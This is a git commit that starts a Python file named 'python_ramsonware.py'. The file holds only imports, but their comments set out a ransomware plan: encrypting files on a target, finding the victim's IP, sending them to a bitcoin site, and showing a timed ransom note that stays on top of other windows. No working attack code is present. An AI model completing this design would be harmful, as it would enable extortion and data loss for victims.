d080bf9cecc79ad029b8ea0c735f441075cc7ff9
K1ko <80548418+K1ko@users.noreply.github.com>
2022-12-27 15:08:16 +0100

    Imported libraries

---
+++ python_ramsonware.py
@@ -0,0 +1,16 @@
+from cryptography.fernet import Fernet # encrypt/decrypt files on target system
+import os # to get system root
+import webbrowser # to load webbrowser to go to specific website eg bitcoin
+import ctypes # so we can intereact with windows dlls and change windows background etc
+import urllib.request # used for downloading and saving background image
+import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
+import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
+import datetime # to give time limit on ransom note
+import subprocess # to create process for notepad and open ransom  note
+import win32gui # used to get window text to see if ransom note is on top of all other windows
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES, PKCS1_OAEP
+import base64
+import threading # used for ransom note and decryption key on dekstop
+
